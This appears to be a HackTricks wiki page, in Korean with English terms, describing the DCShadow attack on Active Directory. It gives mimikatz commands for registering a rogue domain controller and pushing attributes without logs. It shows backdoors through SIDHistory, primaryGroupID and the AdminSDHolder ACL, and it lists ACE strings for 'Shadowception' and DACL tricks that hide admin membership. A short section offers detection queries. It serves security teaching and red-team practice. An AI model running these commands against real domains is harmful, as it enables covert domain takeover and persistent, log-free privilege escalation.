# DCShadow

{{#include ../../banners/hacktricks-training.md}}


## Basic Information

AD에 **새 Domain Controller**를 등록하고 이를 사용해 지정된 객체에 **attributes**(SIDHistory, SPNs...)를 **push**하며, **변경 사항**에 대한 어떠한 **로그**도 남기지 않습니다. **DA** 권한이 필요하며 **root domain** 내부에 있어야 합니다.\
잘못된 데이터를 사용하면 매우 좋지 않은 로그가 나타난다는 점에 유의하세요.<sup>[[2]](#references)</sup>

공격을 수행하려면 mimikatz 인스턴스 2개가 필요합니다. 하나는 SYSTEM 권한으로 RPC servers를 시작하고(여기에서 수행하려는 변경 사항을 지정해야 합니다), 다른 인스턴스는 값을 push하는 데 사용됩니다:
```bash:mimikatz1 (RPC servers)
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```

```bash:mimikatz2 (push) - Needs DA or similar
lsadump::dcshadow /push
```
**`elevate::token`**은 `mimikatz1` 세션에서 작동하지 않는다는 점에 유의하세요. 이는 thread의 권한을 상승시키지만, 여기서는 **process의 권한**을 상승시켜야 합니다.\
"LDAP" object도 선택할 수 있습니다: `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

DA 또는 다음과 같은 최소 권한을 가진 사용자로 변경 사항을 push할 수 있습니다.

- **domain object**에서:
- _DS-Install-Replica_ (Domain에서 Replica 추가/제거)
- _DS-Replication-Manage-Topology_ (Replication Topology 관리)
- _DS-Replication-Synchronize_ (Replication 동기화)
- **Configuration container**의 **Sites object**(및 그 하위 object)에서:
- _CreateChild and DeleteChild_
- DC로 등록된 **computer object**에서:
- _WriteProperty_ (Write 아님)
- **target object**에서:
- _WriteProperty_ (Write 아님)

[**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1)을 사용하여 권한이 없는 사용자에게 이러한 권한을 부여할 수 있습니다. (이 작업은 일부 로그를 남긴다는 점에 유의하세요.) 이는 DA 권한을 보유하는 것보다 훨씬 제한적입니다.\
예: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose` 이는 _**student1**_ username이 _**mcorp-student1**_ machine에 로그인했을 때 _**root1user**_ object에 대한 DCShadow 권한을 가진다는 의미입니다.

## DCShadow를 사용하여 backdoors 생성하기
```bash:Set Enterprise Admins in SIDHistory to a user
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```

```bash:Change PrimaryGroupID (put user as member of Domain Administrators)
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```

```bash:Modify ntSecurityDescriptor of AdminSDHolder (give Full Control to a user)
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
### Primary group abuse, enumeration gaps, and detection

- `primaryGroupID`는 group의 `member` 목록과 별개의 attribute입니다. DCShadow/DSInternals는 이를 직접 기록할 수 있으며(예: **Domain Admins**에 `primaryGroupID=512` 설정), on-box LSASS enforcement 없이 수행됩니다. 하지만 AD는 여전히 사용자를 **이동**시킵니다. PGID를 변경하면 이전 primary group에서의 membership이 항상 제거되므로(모든 대상 group에서 동일한 동작), 기존 primary-group membership을 유지할 수 없습니다.<sup>[[1]](#references)</sup>
- 기본 tools는 사용자를 현재 primary group에서 제거하지 못하도록 합니다(`ADUC`, `Remove-ADGroupMember`). 따라서 PGID 변경에는 일반적으로 직접 directory write(DCShadow/`Set-ADDBPrimaryGroup`)가 필요합니다.
- Membership reporting은 일관되지 않습니다.
- **primary-group에서 파생된 members를 포함**: `Get-ADGroupMember "Domain Admins"`, `net group "Domain Admins"`, ADUC/Admin Center.
- **primary-group에서 파생된 members를 제외**: `Get-ADGroup "Domain Admins" -Properties member`, ADSI Edit에서 `member` 검사, `Get-ADUser <user> -Properties memberOf`.
- **primary group 자체가 nested인 경우** recursive checks에서 primary-group members를 누락할 수 있습니다(예: user의 PGID가 Domain Admins 내부의 nested group을 가리키는 경우). `Get-ADGroupMember -Recursive` 또는 LDAP recursive filters는 primary groups를 명시적으로 resolve하지 않는 한 해당 user를 반환하지 않습니다.
- DACL tricks: attackers는 user의 `primaryGroupID`에 대해(또는 AdminSDHolder가 아닌 groups의 `member` attribute에 대해) **ReadProperty를 deny**하여 대부분의 PowerShell queries에서 effective membership을 숨길 수 있습니다. `net group`은 여전히 membership을 resolve합니다. AdminSDHolder-protected groups는 이러한 denies를 reset합니다.

Detection/monitoring examples:
```powershell
# Find users whose primary group is not the default Domain Users (RID 513)
Get-ADUser -Filter * -Properties primaryGroup,primaryGroupID |
Where-Object { $_.primaryGroupID -ne 513 } |
Select-Object Name,SamAccountName,primaryGroupID,primaryGroup
```

```powershell
# Find users where primaryGroupID cannot be read (likely denied via DACL)
Get-ADUser -Filter * -Properties primaryGroupID |
Where-Object { -not $_.primaryGroupID } |
Select-Object Name,SamAccountName
```
권한이 있는 그룹을 교차 확인하려면 `Get-ADGroupMember` 출력 결과를 `Get-ADGroup -Properties member` 또는 ADSI Edit와 비교하여 `primaryGroupID`나 숨겨진 attribute로 인해 발생한 불일치를 확인합니다.<sup>[[1]](#references)</sup>

## Shadowception - DCShadow를 사용하여 DCShadow 권한 부여 (수정된 permissions 로그 없음)

다음 ACE를 사용자의 SID와 함께 끝에 추가해야 합니다:<sup>[[2]](#references)</sup>

- 도메인 object에서:
- `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
- `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
- attacker computer object에서: `(A;;WP;;;UserSID)`
- target user object에서: `(A;;WP;;;UserSID)`
- Configuration container의 Sites object에서: `(A;CI;CCDC;;;UserSID)`

object의 현재 ACE를 가져오려면: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=local")).psbase.ObjectSecurity.sddl`

이 경우에는 하나가 아니라 **여러 변경 사항**을 적용해야 합니다. **mimikatz1 session** (RPC server)에서 각 변경 사항에 **`/stack` parameter**를 사용합니다. 그런 다음 rogue server에서 stack된 모든 변경 사항을 적용하려면 **`/push`**를 한 번만 사용하면 됩니다.

[**ired.team의 DCShadow에 대한 추가 정보.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)<sup>[[2]](#references)</sup>

## References

- [1] [TrustedSec - Primary Group 동작, Reporting 및 Exploitation 탐구](https://trustedsec.com/blog/adventures-in-primary-group-behavior-reporting-and-exploitation)
- [2] [ired.team의 DCShadow write-up](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)
{{#include ../../banners/hacktricks-training.md}}
